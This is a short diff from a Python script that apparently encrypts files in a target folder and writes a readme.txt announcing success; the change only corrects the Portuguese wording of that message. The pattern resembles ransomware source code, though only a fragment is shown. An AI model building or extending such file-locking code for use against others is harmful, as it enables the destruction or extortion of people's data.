@@ -32,4 +32,4 @@ key = retornarKey()
 encrypt(full_path, key)
 
 with open (path_to_encrypt+'/'+'readme.txt', 'w') as file:
-    file.write("Archivos encriptados com sucesso\n")
+    file.write("Arquivos criptografado com sucesso\n")
